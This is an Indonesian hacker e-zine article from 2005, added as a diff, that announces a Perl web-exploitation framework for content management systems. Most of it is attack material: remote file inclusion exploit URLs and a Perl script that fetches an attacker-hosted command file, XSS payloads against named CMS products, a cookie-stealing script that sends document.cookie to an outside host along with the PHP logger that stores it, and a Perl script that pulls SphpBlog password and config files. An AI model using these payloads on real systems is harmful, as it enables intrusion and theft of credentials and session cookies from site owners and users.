@@ -1,0 +1,325 @@
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH  HHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHH
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH  HHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHH
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH  HHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHH
+HHHHHHHHHHHHHHHHHHHHH   HHHH   HHH  HHHHHH   HHH HHH      HH  HH  H HHHH   HH
+HHHHHHHHHHHHHHHHHHHH  H  HH  H  HH    HHH     HH HHHHHHH  HHHHHH     HH  H  H
+HHHHHHHHHHHHHHHHHHHH     HH  HHHHH  H  HH  H  HH HHHHHH  HHH  HH  H  HH     H
+HHHHHHHHHHHHHHHHHHHH  HHHHH  HHHHH  H  HH  H  HH HHHHH  HHHH  HH  H  HH  HHHH
+HHHHHHHHHHHHHHHHHHHH  H  HH  H  HH  H  HH  H  HH HHHH  HHHHH  HH  H  HH  H  H
+HHHHHHHHHHHHHHHHHHHHH   HHHH   HHH  H  HHH   HHH HHH      HH  HH  H  HHH   HH
+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
+                                          echo|zine, Vol 3 Issue 11, 05-05-05
+
+
+------------|  w[x]f Project
+               y3dips <y3dips@gmail.com>
+
+
+------|  Intro
+
+
+Artikel ini membahas tentang suatu project pembuatan aplikasi yang
+dapat digunakan untuk melakukan penetration testing / assessment
+terhadap aplikasi yang di jalankan pada suatu web server (khususnya
+aplikasi CMS)
+
+        Project Name : WebXploit Framework
+        Unique Name  : w[x]f
+        Leader       : y3dips <y3dips@gmail.com>
+        web          : http://wxf.siteburg.com
+        member       : 1 (still one)
+        License      : GNU/GPL
+        Programming
+        language     : PERL
+        OS           : Independent
+        Description  : Aplikasi yang dapat digunakan untuk melakukan
+                       pen-test/assessment terhadap aplikasi web
+                       -- web application exploit library ---
+        started      : April 2005
+
+
+------|  Preface
+
+
+Setelah mengunjungi event BCS'05[1], penulis semakin yakin untuk memulai
+project ini, terutama setelah mendapatkan input dari world-class hackers.
+
+  "Saat ini target hacking sudah berubah dari sistem ke aplikasi."
+	-- Skyper, Phrack editor-in-chief
+
+  "95% perusahaan kena hack dari aplikasi web."
+  "3 dari 4 website vulnerable."
+	-- Shreeraj Shah, Net-Square founder
+                          "Web Hacking: Attacks and Defense" author
+
+  "Dari statistik Zone-H, sebagian besar defacement terjadi karena
+   sistem yang tidak di-patch dan juga kelalaian admin."
+	-- Roberto Preatoni aka Sys64738, Zone-H founder
+
+Secara lengkap, informasi mengenai BCS'05 dapat dilihat pada website
+resminya[1] dan juga event summary[2] yang penulis buat.
+
+
+------|  Background
+
+
+Semakin maraknya aksi hacking menggunakan web/http yang lebih dikenal
+dengan istilah web-hacking membuat "w[x]f project" ini layak untuk
+digarap serius.
+
+Sebenarnya ide ini sudah lama terlintas saat penulis mulai belajar mencari
+bugs/holes/vulnerabilities aplikasi web (khususnya CMS) dan dengan
+beberapa jenis attack yang terdata (WATSC) ataupun tak terdata maka
+terdapat pola untuk "metode penyerangan" dan "exploitasi" terhadap 
+aplikasi-aplikasi itu berbeda.
+
+
+------|  Basic Theory
+
+
+Perhatikan beberapa advisories berikut ini:
+
+
+---| I. PHP remote file inclusion
+
+
+  1. Remote Command Execution vulnerability in BBS E-Market Professional
+     [http://echo.or.id/adv/adv06-y3dips-2004.txt]
+
+     Vulnerabilities:
+     ~~~~~~~~~~~~~~~~
+
+     Remote command execution on becommunity (modules that support by 
+     BBSemarket professional) makes insecure calls to the include() function 
+     of PHP (works on " pageurl= " functions) which can allow the inclusion 
+     of remote files, and thereby the execution of arbitrary commands by 
+     remote user with the web server user permissions, usually 'nobody' .
+
+     Exploit:
+     ~~~~~~~~
+     http://[URL]/becommunity/community/index.php?pageurl=[evil file]
+
+
+  2. SocialMPN Remote File Inclusion
+     [http://waraxe.us/ftopic-542-0-days0-orderasc-.html]
+
+     # SocialMPN Remote File Inclusion
+     # 06/03/2005
+     # discovered by zer0-c00l (irc.BRASnet.org at #NMAP)
+     # or email (lucaszero [at] gmail [dot] com)
+     # Versions of SocialMPN affected: All versions.
+     # SocialMPN oficial site: www.socialmpn.com (Its vulnerable too)
+     # PS.: A lot of sites (maybe all sites) has SafeMode in PHP.
+
+     Exploit:
+     ~~~~~~~~
+     http://[URL]/modules.php?name=[evil file]&file=article&sid=2
+
+
+Untuk melakukan proses eksploitasi, kita dapat menggunakan script berikut..
+
+<++> echo11-008/becommunity-exp.pl
+#!/usr/bin/perl -w
+
+require LWP::UserAgent;
+
+if(@ARGV == 1)
+        {
+
+$target= $ARGV[0];//http://[victim]/becommunity/community/index.php?pageurl=
+$xploit= $ARGV[1];//http://[attacker]/cmd.txt
+
+        my $ua = LWP::UserAgent->new;
+           $ua->agent("MSIE/6.0 Windows");
+           $ua->timeout(10);
+           $ua->env_proxy;
+
+           $url = "http://$target=$exploit";
+           my $injek = $ua->get($url);
+
+           print "  -------------------------------\n";
+           if ($injek->is_success)
+              { print $injek->content;}
+           else
+              {die $injek->status_line;}
+           print "  -------------------------------\n";
+        }
+
+else
+{ print "Use: perl $0 [target] \n"; }
+<--> echo11-008/becommunity.pl
+
+
+---|  II. XSS (Cross site Scripting)
+
+
+  1. XSS on endonesia CMS
+
+     Exploit:
+     ~~~~~~~~
+     http://[URL]/endon/mod.php?mod=publisher&op=search&query=%3Cscript%
+     \3Ealert(document.cookie)%3C/script%3E
+
+
+  2. XSS on Exponent CMS
+
+     Exploit:
+     ~~~~~~~~
+     http://[URL]/expo/index.php?action=createuser&module=%3Cscript%3Ealert
+     \(document.cookie)%3C/script%3E
+
+
+perhatikan kesamaan diantara dua metode eksplotasi diatas sehingga bisa kita 
+membuat formula seperti..
+
+     http://[URL]/[Vuln Path]=[XSS]
+
+dan mengubah command dari <script>alert(document.cookie)</alert>, menjadi 
+<script>document.location='http://www.dummy.com/ambilkue.php?kue='+document.cookie;</script>
+
+<++> echo11-008/ambilkue.php
+<?php
+$fp = fopen('catet.txt','a');
+fputs($fp, $_GET['kue']."[stop]");
+fclose($fp);
+?>
+<--> echo11-008/ambilkue.php
+
+Selanjutnya tinggal menampilkan hasil dari file "catet.txt".
+
+
+---|  III. Information disclosure
+
+
+  1. Information Dislosure in SphpBlog
+     [http://echo.or.id/adv/adv12-y3dips-2005.txt]
+
+     Exploit:
+     ~~~~~~~~
+     http://[Url]/sphpblog/config/password.txt
+     http://[Url]/sphpblog/config/config.txt
+
+     << formula >>
+
+     http://[URL]/[Path]/[file]
+
+Saya telah membuatkan script sederhana untuk grabbing isi file
+
+<++> echo11-008/sphpblog-exp.pl
+#!/usr/bin/perl -w
+
+print "\n*Remote grabbing sphpblog password&config file by y3dips*\n";
+require LWP::UserAgent;
+
+if(@ARGV == 1)
+        {
+
+$target= $ARGV[0];
+
+my $ua = LWP::UserAgent->new;
+$ua->agent("MSIE/6.0 Windows");
+$ua->timeout(10);
+$ua->env_proxy;
+
+my @url = ("http://$target/config/password.txt",
+\"http://$target/config/config.txt");
+
+foreach my $urlz (@url) {
+            my $injek = $ua->get($urlz);
+            print "\n-------------------------------\n";
+            if ($injek->is_success)
+                 {   print $injek->content;}
+            else
+                 {die $injek->status_line;}
+            print "\n-------------------------------\n";
+
+}
+}
+else {
+print "Use: perl $0 [www.target.com] \n";
+}
+
+# EOF y3dips(c)2005
+<--> echo11-008/sphpblog-exp.pl
+
+
+---|  IV. etc..
+
+Masih banyak lagi jenis web vulnerabilites yang memiliki kesamaan dalam
+metode pengexploitasiannya. Untuk info mengenai jenis vulnerabilities
+web bisa melihat artikel yang dikeluarkan oleh www.webappsec.org
+
+>>title : Web Application Security Consortium Threat Clasification
+>>url   : http://www.webappsec.org/projects/threat/v1/WASC-TC-v1_0.txt
+
+
+------|  Core System
+
+
+Untuk tahap awal, w[x]f masih bersifat pasif -- hanya mengumpulkan informasi
+terhadap aplikasi web beserta exploitnya, dan pada pengembangan lanjut,
+w[x]f diharapkan dapat digunakan sebagai pentest//web assessment tool.
+
+Adapun beberapa hal yang menjadi acuan :
+
+  0. Dibuat dengan bahasa pemrograman PERL (bisa di kembangkan dengan C)
+  1. Pengggunaan module LWP untuk menggantikan metode penggunaan socket
+  2. Penggunaan module untuk mempermudah manajemen penambahan exploit
+  3. Metasploit framework[3] untuk aplikasi contoh struktur dan interface
+  4. HTTrack untuk metode grabbing keseluruhan situs (pengembangan)
+  5. WIKTO untuk metode scanning dan google-hack (pengembangan)
+
+simple Map
+
+<w[x]f Interface>
+        |(Use)
+        +-> - php injection ---+
+            - Xss              |(choose)
+            - info Disc        +-> - becommunity --+
+            - SQl injection        - SocialMPN     |(exploit)
+            - path traversal                       +-->Set Target  URL
+            - [etc]                                    Set Exploit URL
+                                                       Set command*
+
+
+
+------|  Referensi
+
+
+[01] Bellua Cyber Security 2005. http://www.bellua.com/bcs2005/
+[02] y3dips, "BCS Resume", 2005. http://geocities.com/paperecho/bcs2005/bcs.txt
+[03] Metasploit Framework. http://metasploit.com
+[04] CPAN. http://cpan.org
+[05] ECHO Advisories. http://echo.or.id/adv/
+[06] Waraxe.us. http://waraxe.us
+[07] Sensepost. http://sensepost.com
+[08] HTTRACK. http://httrack.com
+[09] Google. http://google.com
+[10] WebAppSec. http://webappsec.org
+
+
+------|  Contact
+
+
+Bagi yang ingin memberi masukan, ide, kritik dan saran. Juga bagi yang 
+berminat untuk bergabung dapat kirim email ke y3dips@gmail.com dengan
+subject: join w[x]f
+
+Diutamakan bagi yang :
+- Menguasai PERL dan logika pemrograman
+- Memahami cara kerja Metasploit
+- Mempunyai pemahaman yang baik dalam hal web-hacking dan security
+- Mau belajar dan bekerja keras
+
+
+------|  Greetz
+
++ m0by the_day comex z3r0byt3 k-159 c-a-s-e s`to lirva32 anonymous
++ negative Biatch-x sakitjiwa yudhax
++ waraxe &&allguys in waraxe.us l33tdawg &&allguys in hackinthebox.org
++ newbie_hacker@yahoogroups.com
++ e-c-h-o @ Dalnet
+
+
+---|  EOF
